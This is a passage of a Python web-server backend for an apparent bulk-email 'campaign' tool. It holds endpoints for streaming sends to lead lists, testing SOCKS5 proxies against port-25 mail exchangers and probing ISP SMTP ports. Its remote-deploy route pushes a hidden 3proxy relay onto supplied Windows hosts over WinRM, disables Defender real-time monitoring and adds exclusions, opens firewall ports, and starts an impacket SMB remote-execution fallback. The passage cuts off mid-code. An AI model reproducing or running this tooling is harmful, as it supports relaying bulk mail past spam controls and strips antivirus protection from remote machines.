        # ── Support tickets: list ─────────────────────────────────────────
        elif p.startswith("/api/tickets"):
            if not (sess := self._auth()): return
            uid  = sess["user_id"]
            role = sess["role"]
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(p).query)
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                if role in ("admin","superadmin","moderator"):
                    # Admins see all tickets
                    status_filter = qs.get("status", ["all"])[0]
                    if status_filter == "all":
                        rows = conn.execute(
                            "SELECT t.id,t.user_id,u.username,t.subject,t.status,t.priority,t.created_at,t.updated_at,"
                            "(SELECT COUNT(*) FROM ticket_messages WHERE ticket_id=t.id) as msg_count "
                            "FROM support_tickets t JOIN users u ON t.user_id=u.id "
                            "ORDER BY t.updated_at DESC LIMIT 100"
                        ).fetchall()
                    else:
                        rows = conn.execute(
                            "SELECT t.id,t.user_id,u.username,t.subject,t.status,t.priority,t.created_at,t.updated_at,"
                            "(SELECT COUNT(*) FROM ticket_messages WHERE ticket_id=t.id) as msg_count "
                            "FROM support_tickets t JOIN users u ON t.user_id=u.id "
                            "WHERE t.status=? ORDER BY t.updated_at DESC LIMIT 100",
                            (status_filter,)
                        ).fetchall()
                else:
                    rows = conn.execute(
                        "SELECT t.id,t.user_id,u.username,t.subject,t.status,t.priority,t.created_at,t.updated_at,"
                        "(SELECT COUNT(*) FROM ticket_messages WHERE ticket_id=t.id) as msg_count "
                        "FROM support_tickets t JOIN users u ON t.user_id=u.id "
                        "WHERE t.user_id=? ORDER BY t.updated_at DESC",
                        (uid,)
                    ).fetchall()
                conn.close()
            tickets = [{"id":r[0],"user_id":r[1],"username":r[2],"subject":r[3],
                        "status":r[4],"priority":r[5],"created_at":r[6],
                        "updated_at":r[7],"msg_count":r[8]} for r in rows]
            self._json(200, {"tickets": tickets})

        # ── Support ticket: get messages ──────────────────────────────────
        elif p.startswith("/api/ticket/"):
            if not (sess := self._auth()): return
            try:
                tid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid ticket ID"}); return
            uid  = sess["user_id"]
            role = sess["role"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                ticket = conn.execute(
                    "SELECT t.*,u.username FROM support_tickets t "
                    "JOIN users u ON t.user_id=u.id WHERE t.id=?", (tid,)
                ).fetchone()
                if not ticket:
                    conn.close(); self._json(404, {"error": "Ticket not found"}); return
                if role not in ("admin","superadmin","moderator") and ticket[1] != uid:
                    conn.close(); self._json(403, {"error": "Access denied"}); return
                msgs = conn.execute(
                    "SELECT id,sender_id,sender_name,is_admin,body,created_at "
                    "FROM ticket_messages WHERE ticket_id=? ORDER BY created_at",
                    (tid,)
                ).fetchall()
                conn.close()
            self._json(200, {
                "ticket": {"id":ticket[0],"user_id":ticket[1],"subject":ticket[3],
                           "status":ticket[4],"priority":ticket[5],
                           "created_at":ticket[6],"updated_at":ticket[7],"username":ticket[8]},
                "messages": [{"id":m[0],"sender_id":m[1],"sender_name":m[2],
                               "is_admin":bool(m[3]),"body":m[4],"created_at":m[5]} for m in msgs]
            })

        else:
            self._json(404, {"error": "Not found"})

    def do_POST(self):
        p = self.path
        try:
            n = int(self.headers.get("Content-Length", 0))
            self._body_bytes = self.rfile.read(n) if 0 < n <= MAX_BODY_BYTES else b""
        except Exception:
            self._body_bytes = b""
        try:
            self._do_POST_inner(p)
        except Exception as e:
            log.exception("do_POST unhandled exception for %s", p)
            try: self._json(500, {"error": str(e)})
            except Exception: pass

    def _do_POST_inner(self, p):
        # ── Login ────────────────────────────────────────────
        if p == "/api/login":
            ip = self._ip()
            if not check_rate_limit(ip):
                self._json(429, {"error": f"Too many attempts. Wait {LOCKOUT_MINUTES} min."})
                return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return

            user = authenticate(data.get("username", ""), data.get("password", ""))
            if not user:
                record_attempt(ip)
                self._json(401, {"error": "Invalid username or password"}); return

            LOGIN_ATTEMPTS.pop(ip, None)
            token = create_session(user)

            # Send login notification via Telegram (non-blocking)
            if TG_AVAILABLE:
                try:
                    ua = self.headers.get("User-Agent", "")[:80]
                    import threading as _thr
                    _thr.Thread(target=tg.notify_login,
                                args=(user["id"], ip, ua), daemon=True).start()
                except Exception:
                    pass

            # Check if 2FA is required
            if TG_AVAILABLE and tg.is_2fa_required(user["id"]):
                otp_sent = tg.generate_otp(user["id"])
                if otp_sent:
                    # Return a pending state — frontend must verify OTP
                    self._json(200, {
                        "pending_2fa": True,
                        "pending_token": token,
                        "username": user["username"],
                        "role": user["role"],
                    })
                    return

            self._json(200, {"token": token, "username": user["username"], "role": user["role"]})

        # ── Logout ───────────────────────────────────────────
        elif p == "/api/logout":
            token = self._token()
            if token:
                with sessions_lock:
                    SESSIONS.pop(token, None)
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("DELETE FROM sessions WHERE token=?", (token,))
                    conn.commit(); conn.close()
            self._json(200, {"status": "ok"})

        # ── Change own password ──────────────────────────────
        elif p == "/api/change-password":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            new_pw = data.get("new", "")
            if len(new_pw) < MIN_PW_LEN:
                self._json(400, {"error": f"Password must be ≥{MIN_PW_LEN} characters"}); return
            if not authenticate(sess["username"], data.get("current", "")):
                self._json(401, {"error": "Current password is incorrect"}); return
            if HAS_BCRYPT:
                pw_hash, salt = hash_password(new_pw), ""
            else:
                salt = secrets.token_hex(16)
                pw_hash = hash_password(new_pw, salt)
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET password_hash=?, salt=? WHERE id=?",
                             (pw_hash, salt, sess["user_id"]))
                conn.commit(); conn.close()
            self._json(200, {"status": "ok"})

        # ── SMTP campaign send (chunked streaming) ───────────
        elif p == "/api/send":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return

            self._stream_start()
            sent_count = 0
            failed_count = 0
            total_count = len(data.get("leads", []))
            camp_name = data.get("campaignName", "Campaign")
            started_at = datetime.now().isoformat()
            run_id = None

            # Create campaign_runs record
            try:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    cur = conn.execute(
                        "INSERT INTO campaign_runs (user_id, name, status, method, sent, failed, total, started_at) VALUES (?,?,?,?,?,?,?,?)",
                        (sess["user_id"], camp_name, "running", data.get("method","smtp"), 0, 0, total_count, started_at)
                    )
                    run_id = cur.lastrowid
                    conn.commit()
                    conn.close()
            except Exception:
                pass

            # Track this campaign for the user
            uid = sess["user_id"]
            with active_campaigns_lock:
                ACTIVE_CAMPAIGNS[uid] = ACTIVE_CAMPAIGNS.get(uid, 0) + 1

            try:
                data["_uid"] = sess["user_id"]
                last_ping = time.time()
                for event in process_campaign(data):
                    if event.get("type") == "success":
                        sent_count += 1
                    elif event.get("type") == "error":
                        failed_count += 1
                    try:
                        self._stream_chunk(event)
                    except (BrokenPipeError, ConnectionResetError, OSError):
                        break  # client disconnected — stop streaming
                    except Exception:
                        pass  # never let a stream write error stop the campaign
                    # Keepalive: send a heartbeat ping every 30s so the connection
                    # doesn't get killed by TCP idle timeout or OS network stack
                    now = time.time()
                    if now - last_ping > 30:
                        try:
                            self._stream_chunk({"type": "ping", "ts": int(now)})
                        except Exception:
                            pass
                        last_ping = now
            except (BrokenPipeError, ConnectionResetError, OSError):
                pass  # client disconnected — campaign already done
            except GeneratorExit:
                pass
            except Exception as e:
                try:
                    self._stream_chunk({"type": "error", "error": f"Server error: {str(e)[:300]}"})
                except Exception:
                    pass

            # Decrement active campaign count
            with active_campaigns_lock:
                uid = sess.get("user_id")
                if uid and ACTIVE_CAMPAIGNS.get(uid, 0) > 0:
                    ACTIVE_CAMPAIGNS[uid] -= 1

            # Update campaign_runs record with final stats
            if run_id:
                try:
                    with db_lock:
                        conn = sqlite3.connect(DB_PATH)
                        conn.execute(
                            "UPDATE campaign_runs SET status=?, sent=?, failed=?, finished_at=? WHERE id=?",
                            ("done", sent_count, failed_count, datetime.now().isoformat(), run_id)
                        )
                        conn.commit()
                        conn.close()
                except Exception:
                    pass

            self._stream_end()

        # ── Save campaign ────────────────────────────────────
        elif p == "/api/campaigns/save":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            uid        = sess["user_id"]
            name       = data.get("name", "Untitled Campaign")
            config     = json.dumps(data.get("config", {}))
            checkpoint = int(data.get("checkpoint", 0))
            sent       = int(data.get("sent", 0))
            total      = int(data.get("total", 0))
            camp_id    = data.get("id")
            try:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    if camp_id:
                        conn.execute(
                            "UPDATE saved_campaigns SET name=?,config=?,checkpoint=?,sent=?,total=?,updated_at=? WHERE id=? AND user_id=?",
                            (name, config, checkpoint, sent, total, datetime.now().isoformat(), camp_id, uid)
                        )
                    else:
                        cur = conn.execute(
                            "INSERT INTO saved_campaigns (user_id,name,config,checkpoint,sent,total) VALUES (?,?,?,?,?,?)",
                            (uid, name, config, checkpoint, sent, total)
                        )
                        camp_id = cur.lastrowid
                    conn.commit(); conn.close()
                self._json(200, {"ok": True, "id": camp_id, "name": name})
            except Exception as e:
                self._json(200, {"ok": False, "error": str(e)})

        # ── List saved campaigns ──────────────────────────────
        elif p == "/api/campaigns/saved":
            if not (sess := self._auth()): return
            try:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    rows = conn.execute(
                        "SELECT id,name,checkpoint,sent,total,updated_at FROM saved_campaigns WHERE user_id=? ORDER BY updated_at DESC LIMIT 50",
                        (sess["user_id"],)
                    ).fetchall()
                    conn.close()
                self._json(200, {"campaigns": [
                    {"id":r[0],"name":r[1],"checkpoint":r[2],"sent":r[3],"total":r[4],"updated_at":r[5]}
                    for r in rows
                ]})
            except Exception as e:
                self._json(200, {"campaigns": [], "error": str(e)})

        # ── Load saved campaign ───────────────────────────────
        elif p.startswith("/api/campaigns/load/"):
            if not (sess := self._auth()): return
            camp_id = p.split("/")[-1]
            try:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    row = conn.execute(
                        "SELECT id,name,config,checkpoint,sent,total FROM saved_campaigns WHERE id=? AND user_id=?",
                        (camp_id, sess["user_id"])
                    ).fetchone()
                    conn.close()
                if row:
                    self._json(200, {"ok":True,"id":row[0],"name":row[1],"config":json.loads(row[2]),"checkpoint":row[3],"sent":row[4],"total":row[5]})
                else:
                    self._json(404, {"error": "Campaign not found"})
            except Exception as e:
                self._json(500, {"error": str(e)})

        # ── Delete saved campaign ─────────────────────────────
        elif p.startswith("/api/campaigns/delete/"):
            if not (sess := self._auth()): return
            camp_id = p.split("/")[-1]
            try:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("DELETE FROM saved_campaigns WHERE id=? AND user_id=?", (camp_id, sess["user_id"]))
                    conn.commit(); conn.close()
                self._json(200, {"ok": True})
            except Exception as e:
                self._json(500, {"error": str(e)})

        # ── Test proxy ───────────────────────────────────────
        elif p == "/api/ping":
            # Latency probe for send-rate auto-detect
            self._json(200, {"pong": True})

        elif p == "/api/test-proxy":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return

            proxy_cfg = data.get("proxy", {})
            steps     = []

            # ── Parse raw proxy string ─────────────────────────
            if isinstance(proxy_cfg, str):
                raw = proxy_cfg.strip()
                try:
                    import re as _re
                    if "://" in raw:
                        m = _re.match(r'(socks5|http|https)://(?:([^:@]+):([^@]*)@)?([^:]+):(\d+)', raw)
                        if m:
                            proxy_cfg = {"type": m.group(1), "user": m.group(2) or "",
                                         "pass": m.group(3) or "", "host": m.group(4),
                                         "port": int(m.group(5))}
                        else:
                            raise ValueError("bad URI")
                    else:
                        parts = raw.split(":")
                        proxy_cfg = {"type": "socks5",
                                     "host": parts[0] if parts else "",
                                     "port": int(parts[1]) if len(parts) > 1 else 1080,
                                     "user": parts[2] if len(parts) > 2 else "",
                                     "pass": ":".join(parts[3:]) if len(parts) > 3 else ""}
                except Exception as _pe:
                    self._json(400, {"error": f"Could not parse proxy string: {_pe}"}); return

            if not proxy_cfg.get("host"):
                self._json(400, {"error": "No proxy host specified"}); return

            p_host = proxy_cfg.get("host", "")
            p_port = int(proxy_cfg.get("port", 1080))
            p_user = (proxy_cfg.get("username") or proxy_cfg.get("user") or "").encode()
            p_pass = (proxy_cfg.get("password") or proxy_cfg.get("pass") or "").encode()

            smtp_host = (data.get("ispSmtpHost") or data.get("smtpHost") or "gmail-smtp-in.l.google.com").encode()
            smtp_port = int(data.get("ispSmtpPort") or data.get("smtpPort") or 25)

            steps.append(f"CONFIG  {p_host}:{p_port}  user_len={len(p_user)}  pass_len={len(p_pass)}")
            steps.append(f"TARGET  {smtp_host.decode()}:{smtp_port}")

            import socket as _sock, struct as _struct

            # ── Step 1: TCP to proxy ───────────────────────────
            try:
                _s = _sock.create_connection((p_host, p_port), timeout=10)
                steps.append(f"STEP1   TCP {p_host}:{p_port} OPEN")
            except Exception as _e1:
                steps.append(f"STEP1   TCP {p_host}:{p_port} FAILED: {_e1}")
                self._json(200, {"status": "error", "message": str(_e1), "log": steps}); return

            # ── Step 2: SOCKS5 greeting — offer no-auth AND user/pass ──
            # 05=SOCKS5, 02=2 methods, 00=no-auth, 02=user/pass
            try:
                _s.settimeout(10)
                _greeting = b'\x05\x02\x00\x02' if p_user else b'\x05\x01\x00'
                _s.sendall(_greeting)
                steps.append(f"STEP2a  sent greeting {_greeting.hex()}")
                _resp = _s.recv(2)
                steps.append(f"STEP2a  server replied {_resp.hex() if _resp else '(empty — closed)'}")
                if not _resp or len(_resp) < 2:
                    steps.append("STEP2a  server closed immediately after greeting")
                    _s.close()
                    self._json(200, {"status": "error",
                        "message": "Proxy closed connection after SOCKS5 greeting — IP may not be whitelisted, or proxy does not speak SOCKS5",
                        "log": steps}); return
                if _resp[0] != 5:
                    steps.append(f"STEP2a  not SOCKS5 (ver={_resp[0]}) — may be HTTP proxy")
                    _s.close()
                    self._json(200, {"status": "error",
                        "message": f"Not SOCKS5 — server version byte={_resp[0]} (may be HTTP CONNECT proxy)",
                        "log": steps}); return
                chosen_method = _resp[1]
                steps.append(f"STEP2a  server chose method 0x{chosen_method:02x}")
                if chosen_method == 0xFF:
                    _s.close()
                    self._json(200, {"status": "error",
                        "message": "Proxy rejected all auth methods (0xFF) — IP not whitelisted or wrong proxy type",
                        "log": steps}); return
            except Exception as _e2a:
                steps.append(f"STEP2a  FAILED: {_e2a}")
                self._json(200, {"status": "error", "message": f"SOCKS5 greeting failed: {_e2a}", "log": steps}); return

            # ── Step 3: Auth sub-negotiation (if required) ─────
            if chosen_method == 0x02:
                try:
                    _auth_pkt = (bytes([1, len(p_user)]) + p_user +
                                 bytes([len(p_pass)]) + p_pass)
                    _s.sendall(_auth_pkt)
                    steps.append(f"STEP3   sent auth (user_len={len(p_user)} pass_len={len(p_pass)})")
                    _auth_resp = _s.recv(2)
                    steps.append(f"STEP3   server replied {_auth_resp.hex() if _auth_resp else '(empty — closed)'}")
                    if not _auth_resp or len(_auth_resp) < 2:
                        _s.close()
                        self._json(200, {"status": "error",
                            "message": "Auth sub-negotiation: server closed immediately — credentials rejected",
                            "log": steps}); return
                    if _auth_resp[1] != 0:
                        _s.close()
                        self._json(200, {"status": "error",
                            "message": f"Auth rejected by proxy (status=0x{_auth_resp[1]:02x}) — wrong username/password",
                            "log": steps}); return
                    steps.append("STEP3   AUTH OK")
                except Exception as _e3:
                    steps.append(f"STEP3   FAILED: {_e3}")
                    self._json(200, {"status": "error", "message": f"Auth failed: {_e3}", "log": steps}); return
            elif chosen_method == 0x00:
                steps.append("STEP3   no auth required (method 0x00)")

            # ── Step 4: CONNECT request ────────────────────────
            try:
                # Build CONNECT: VER=5 CMD=1 RSV=0 ATYP=3 (domain) + len + domain + port
                _host_b = smtp_host
                _connect_pkt = (b'\x05\x01\x00\x03' +
                                bytes([len(_host_b)]) + _host_b +
                                _struct.pack(">H", smtp_port))
                _s.sendall(_connect_pkt)
                steps.append(f"STEP4   sent CONNECT to {smtp_host.decode()}:{smtp_port}")
                _conn_resp = _s.recv(10)
                steps.append(f"STEP4   server replied {_conn_resp.hex() if _conn_resp else '(empty — closed)'}")
                if not _conn_resp:
                    _s.close()
                    self._json(200, {"status": "error",
                        "message": f"CONNECT to {smtp_host.decode()}:{smtp_port} — server closed (port blocked at exit)",
                        "log": steps}); return
                _rep = _conn_resp[1] if len(_conn_resp) > 1 else 0xFF
                _rep_msgs = {0:"OK",1:"general failure",2:"not allowed",3:"net unreachable",
                             4:"host unreachable",5:"refused",6:"TTL expired",7:"bad command",8:"bad addr"}
                steps.append(f"STEP4   REP=0x{_rep:02x} ({_rep_msgs.get(_rep,'unknown')})")
                if _rep != 0:
                    _s.close()
                    self._json(200, {"status": "error",
                        "message": f"Proxy cannot reach {smtp_host.decode()}:{smtp_port} — {_rep_msgs.get(_rep, f'code 0x{_rep:02x}')}",
                        "log": steps}); return
            except Exception as _e4:
                steps.append(f"STEP4   FAILED: {_e4}")
                self._json(200, {"status": "error", "message": f"CONNECT failed: {_e4}", "log": steps}); return

            # ── Step 5: Read SMTP banner ───────────────────────
            try:
                _t0 = time.time()
                _s.settimeout(8)
                _banner = _s.recv(512).decode("utf-8", errors="replace").strip()[:100]
                latency = round((time.time() - _t0) * 1000)
                steps.append(f"STEP5   SMTP banner: {_banner!r}")
                _s.close()
                self._json(200, {
                    "status":     "ok",
                    "message":    f"Proxy OK — {p_host}:{p_port} → {smtp_host.decode()}:{smtp_port} ({latency}ms) | {_banner}",
                    "latency_ms": latency,
                    "log":        steps,
                })
            except Exception as _e5:
                _s.close()
                steps.append(f"STEP5   banner timeout (non-fatal): {_e5}")
                # Connected is enough — banner timeout is fine
                self._json(200, {
                    "status":     "ok",
                    "message":    f"Proxy OK — {p_host}:{p_port} → {smtp_host.decode()}:{smtp_port} (no banner)",
                    "latency_ms": 0,
                    "log":        steps,
                })
        # ── ISP SMTP Port Probe ───────────────────────────────
        elif p == "/api/isp/probe-smtp":
            if not (sess := self._auth()): return
            try:
                data      = self._read_body()
                smtp_host = data.get("host", "").strip()
                if not smtp_host:
                    self._json(200, {"status":"error","message":"Host required"}); return

                import socket, smtplib, ssl
                PROBE_PORTS = [
                    {"port":25,  "ssl":False, "label":"25 (Plain/STARTTLS)"},
                    {"port":587, "ssl":False, "label":"587 (STARTTLS)"},
                    {"port":465, "ssl":True,  "label":"465 (SSL)"},
                    {"port":2525,"ssl":False, "label":"2525 (Alt)"},
                    {"port":26,  "ssl":False, "label":"26 (Alt)"},
                ]
                results = []
                best = None
                for pp in PROBE_PORTS:
                    port = pp["port"]
                    try:
                        sock = socket.create_connection((smtp_host, port), timeout=5)
                        sock.close()
                        # Try SMTP handshake
                        try:
                            if pp["ssl"]:
                                ctx = ssl.create_default_context()
                                ctx.check_hostname = False
                                ctx.verify_mode = ssl.CERT_NONE
                                with smtplib.SMTP_SSL(smtp_host, port, context=ctx, timeout=6) as s:
                                    banner = s.ehlo()[1].decode(errors="replace") if s.ehlo()[0]==250 else ""
                                    starttls = False
                            else:
                                with smtplib.SMTP(smtp_host, port, timeout=6) as s:
                                    s.ehlo()
                                    starttls = s.has_extn("STARTTLS")
                                    banner = ""
                            results.append({"port":port,"open":True,"ssl":pp["ssl"],"starttls":starttls,"label":pp["label"]})
                            if best is None:
                                best = {"port":port,"ssl":pp["ssl"],"starttls":starttls}
                        except Exception:
                            results.append({"port":port,"open":True,"ssl":pp["ssl"],"starttls":False,"label":pp["label"]})
                            if best is None:
                                best = {"port":port,"ssl":pp["ssl"],"starttls":False}
                    except Exception:
                        results.append({"port":port,"open":False,"label":pp["label"]})

                # Auto-detect EHLO domain from hostname
                parts = smtp_host.split(".")
                ehlo = ".".join(parts[-2:]) if len(parts) >= 2 else smtp_host

                self._json(200, {
                    "status": "ok",
                    "results": results,
                    "best": best,
                    "ehlo": ehlo,
                    "open_count": sum(1 for r in results if r["open"])
                })
            except Exception as e:
                self._json(200, {"status":"error","message":str(e)[:300]})

        # ── ISP Proxy Auto-Deploy ─────────────────────────────
        elif p == "/api/isp/sync":
            # Sync RDP/proxy/assignment data from frontend localStorage to server DB
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
                uid  = sess["user_id"]
                db   = get_db()
                rdps     = data.get("rdps", [])
                proxies  = data.get("proxies", [])
                assign   = data.get("assignments", {})
                # Upsert RDPs
                for r in rdps:
                    db.execute("""
                        INSERT INTO isp_rdps(user_id,client_id,label,host,ssh_port,usr,pass,os,status,data)
                        VALUES(?,?,?,?,?,?,?,?,?,?)
                        ON CONFLICT(user_id,client_id) DO UPDATE SET
                            label=excluded.label, host=excluded.host,
                            ssh_port=excluded.ssh_port, usr=excluded.usr,
                            pass=excluded.pass, status=excluded.status, data=excluded.data
                    """, (uid, str(r.get("id","")), r.get("label",""), r.get("host",""),
                          str(r.get("sshPort","22")), r.get("user",""), r.get("pass",""),
                          r.get("os","windows"), r.get("status","undeployed"), json.dumps(r)))
                # Upsert proxies
                for px in proxies:
                    db.execute("""
                        INSERT INTO isp_proxies(user_id,client_id,label,host,port,usr,pass,type,isp_smtp_host,isp_smtp_port,from_domain,status,data)
                        VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)
                        ON CONFLICT(user_id,client_id) DO UPDATE SET
                            label=excluded.label, host=excluded.host,
                            isp_smtp_host=excluded.isp_smtp_host,
                            isp_smtp_port=excluded.isp_smtp_port, data=excluded.data
                    """, (uid, str(px.get("id","")), px.get("label",""), px.get("host",""),
                          str(px.get("port","17521")), px.get("user",""), px.get("pass",""),
                          px.get("type","socks5"), px.get("ispSmtpHost",""), str(px.get("ispSmtpPort","25")),
                          px.get("fromDomain",""), px.get("status","untested"), json.dumps(px)))
                # Upsert assignments
                for rdp_id, proxy_id in assign.items():
                    db.execute("""INSERT INTO isp_assignments(user_id,rdp_client_id,proxy_client_id)
                        VALUES(?,?,?) ON CONFLICT(user_id,rdp_client_id) DO UPDATE SET proxy_client_id=excluded.proxy_client_id
                    """, (uid, str(rdp_id), str(proxy_id)))
                db.commit()
                self._json(200, {"ok": True, "rdps": len(rdps), "proxies": len(proxies), "assignments": len(assign)})
            except Exception as e:
                self._json(500, {"error": str(e)})

        elif p == "/api/isp/get-tunnels":
            # Get ISP tunnels for current user from DB
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            db  = get_db()
            rows = db.execute("""
                SELECT r.client_id, r.label, r.host, r.status,
                       p.client_id as px_id, p.isp_smtp_host, p.isp_smtp_port, p.data as px_data
                FROM isp_rdps r
                JOIN isp_assignments a ON a.rdp_client_id = r.client_id AND a.user_id = r.user_id
                JOIN isp_proxies p ON p.client_id = a.proxy_client_id AND p.user_id = r.user_id
                WHERE r.user_id = ?
            """, (uid,)).fetchall()
            tunnels = []
            for row in rows:
                tunnels.append({
                    "tunnelType":  "isp",
                    "label":       row[1] or row[2],
                    "sshHost":     row[2],
                    "socksHost":   row[2],
                    "socksPort":   1080,
                    "ispSmtpHost": row[5] or "",
                    "ispSmtpPort": row[6] or "25",
                })
            self._json(200, {"tunnels": tunnels})

        elif p == "/api/isp/deploy":
            if not (sess := self._auth()): return
            try:
                data      = self._read_body()
                host      = data.get("host", "")
                ssh_port  = int(data.get("sshPort", 22))
                user      = data.get("user", "root")
                password  = data.get("pass", "")
                os_type   = data.get("os", "linux")
                px_host   = data.get("proxyHost", "")
                px_port   = data.get("proxyPort", "17521")
                px_user   = data.get("proxyUser", "")
                px_pass   = data.get("proxyPass", "")
                px_type   = data.get("proxyType", "socks5")
                smtp_host = data.get("ispSmtpHost", "")
                smtp_port = data.get("ispSmtpPort", "25")

                if not host or not password:
                    self._json(200, {"status": "error", "message": "Host and password required"}); return
                if not px_host or not smtp_host:
                    self._json(200, {"status": "error", "message": "Proxy host and ISP SMTP host required"}); return

                try:
                    import paramiko
                except ImportError:
                    for cmd in [
                        [sys.executable, "-m", "pip", "install", "paramiko", "--break-system-packages", "-q"],
                        [sys.executable, "-m", "pip", "install", "paramiko", "-q"],
                        ["pip3", "install", "paramiko", "-q"],
                        ["apt-get", "install", "-y", "-q", "python3-paramiko"],
                    ]:
                        try:
                            subprocess.run(cmd, check=True, capture_output=True, timeout=60)
                            import paramiko
                            break
                        except Exception:
                            continue
                    else:
                        self._json(200, {"status": "error", "message": "Could not install paramiko. Run: apt-get install -y python3-paramiko on your VPS"}); return

                # Pre-flight: quick TCP port scan to decide connection method
                import socket as _sock

                def _tcp_open(h, p, t=6):
                    try:
                        s = _sock.create_connection((h, p), timeout=t)
                        s.close()
                        return True
                    except Exception:
                        return False

                ssh_ok    = _tcp_open(host, ssh_port, 8)
                winrm_ok  = (_tcp_open(host, 5985, 5) or _tcp_open(host, 5986, 5)) if not ssh_ok else False
                smb_ok    = _tcp_open(host, 445, 5)  if not ssh_ok else False
                # If os is windows and nothing detected, still attempt WinRM anyway
                if not ssh_ok and os_type == "windows" and not winrm_ok and not smb_ok:
                    winrm_ok = True  # attempt anyway - TCP probe can fail through NAT/provider firewall

                if not ssh_ok and os_type == "windows":
                    # --- Try WinRM (5985 HTTP or 5986 HTTPS) ---
                    if winrm_ok:
                        try:
                            import winrm as _winrm
                        except ImportError:
                            for _c in [
                                [sys.executable,"-m","pip","install","pywinrm","--break-system-packages","-q"],
                                [sys.executable,"-m","pip","install","pywinrm","-q"],
                            ]:
                                try:
                                    subprocess.run(_c, check=True, capture_output=True, timeout=60)
                                    import winrm as _winrm
                                    break
                                except Exception:
                                    continue
                        try:
                            log_lines = []
                            # Try HTTP (5985) first, then HTTPS (5986)
                            _ws = None
                            for _wport, _wproto in [(5985, "http"), (5986, "https")]:
                                try:
                                    _ws_try = _winrm.Session(f"{_wproto}://{host}:{_wport}/wsman",
                                                             auth=(user, password), transport="ntlm",
                                                             server_cert_validation="ignore",
                                                             read_timeout_sec=30, operation_timeout_sec=25)
                                    _ws_try.run_ps("echo test")
                                    _ws = _ws_try
                                    log_lines.append(f"WinRM connected on {_wproto}:{_wport}")
                                    break
                                except Exception:
                                    continue
                            if not _ws:
                                raise Exception("WinRM unreachable on both port 5985 and 5986")
                            def _wrun(cmd):
                                r = _ws.run_ps(cmd)
                                o = (r.std_out or b"").decode(errors="replace").strip()
                                e = (r.std_err or b"").decode(errors="replace").strip()
                                if o: log_lines.append(o)
                                if e: log_lines.append("ERR: "+e)
                                return o + e
                            log_lines.append("Connected via WinRM:5985")
                            _cfg = "\r\n".join(["nserver 8.8.8.8","nserver 1.1.1.1","nscache 65536",
                                "parent 1000 "+px_type+" "+px_host+" "+str(px_port)+" "+px_user+" "+px_pass,
                    "allow *",
                                "proxy -p8025 -i127.0.0.1 -e0.0.0.0","socks -p1080 -i0.0.0.0"])
                            _wrun("New-Item -ItemType Directory -Force C:\\proxy|Out-Null")
                            _wrun("[System.IO.File]::WriteAllText('C:\\proxy\\3proxy.cfg','"+_cfg.replace("'","''")+"')")
                            _wrun("[Net.ServicePointManager]::SecurityProtocol=3072; Invoke-WebRequest 'https://github.com/3proxy/3proxy/releases/download/0.9.5/3proxy-0.9.5-x64.zip' -OutFile C:\\proxy\\3p.zip -UseBasicParsing -TimeoutSec 90")
                            _wrun("Add-MpPreference -ExclusionPath C:\\proxy -EA SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue; Expand-Archive C:\\proxy\\3p.zip C:\\proxy\\ex -Force; $e=Get-ChildItem C:\\proxy\\ex -Recurse -Filter 3proxy.exe|Select-Object -First 1; if($e){Copy-Item $e.FullName C:\\proxy\\3proxy.exe -Force; Unblock-File C:\\proxy\\3proxy.exe -EA SilentlyContinue}")
                            _wrun("Stop-Process -Name 3proxy -Force -EA SilentlyContinue; Start-Sleep 1; Start-Process C:\\proxy\\3proxy.exe 'C:\\proxy\\3proxy.cfg' -WindowStyle Hidden")
                            _wrun("netsh advfirewall firewall add rule name=SynthTelISP dir=in action=allow protocol=tcp localport=1080|Out-Null")
                            _wrun("netsh advfirewall firewall add rule name=SynthTelSMTP dir=in action=allow protocol=tcp localport=8025|Out-Null")
                            # Also install OpenSSH so next deploy uses SSH
                            _wrun("Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 2>$null; Start-Service sshd -EA SilentlyContinue; Set-Service sshd -StartupType Automatic -EA SilentlyContinue; netsh advfirewall firewall add rule name=SSH dir=in action=allow protocol=tcp localport=22|Out-Null")
                            _out = _wrun("if(Get-Process -Name 3proxy -EA SilentlyContinue){'DEPLOY_OK'}else{'DEPLOY_FAIL'}")
                            if "DEPLOY_OK" in _out:
                                self._json(200, {"status":"ok",
                                    "message": f"Deployed via WinRM! OpenSSH also installed for future deploys. Chain: {host}:1080 -> {px_host}:{px_port} -> {smtp_host}:{smtp_port}",
                                    "log": "\n".join(log_lines[-25:])})
                            else:
                                self._json(200, {"status":"error",
                                    "message":"WinRM connected but 3proxy failed to start.",
                                    "log": "\n".join(log_lines[-25:])})
                            return
                        except Exception as _we:
                            self._json(200, {"status":"error",
                                "message":"WinRM failed: "+str(_we)[:200]+". Enable WinRM on RDP: run 'winrm quickconfig -q' as Admin."}); return

                    # --- Try SMB/impacket (port 445) - executes commands via Windows SCM ---
                    elif smb_ok:
                        # Install impacket with prerequisites if not already present
                        _impacket_ok = False
                        try:
                            from impacket.smbconnection import SMBConnection
                            from impacket.dcerpc.v5 import transport, scmr
                            _impacket_ok = True
                        except ImportError:
                            log_lines = []
                            log_lines.append("Installing impacket dependencies…")
                            # Must install crypto libraries FIRST or impacket setup.py fails
                            _deps = ["pyOpenSSL", "pycryptodome", "pycryptodomex",
